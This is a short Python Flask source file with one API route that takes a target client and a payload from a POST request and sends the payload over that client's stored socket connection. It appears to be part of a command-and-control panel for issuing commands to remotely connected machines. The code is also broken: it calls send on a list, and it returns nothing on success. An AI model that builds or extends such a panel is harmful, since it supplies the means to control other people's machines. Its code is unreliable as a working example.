import flask
import threading
import common


api_routes = flask.Blueprint('api', __name__)


@api_routes.route('/api/payload/exec', methods=['POST'])
def exec_payload():
	client = flask.request.form.get('client')
	payload = flask.request.form.get('payload')
	print(flask.request.form)

	if client and payload:
		client_sock = [host for host in common.hosts if host[0][0] == client]
		if client_sock:
			client_sock.send(payload.encode())
		else:
			return "Error", 500
	else:
		return "Missing params", 400
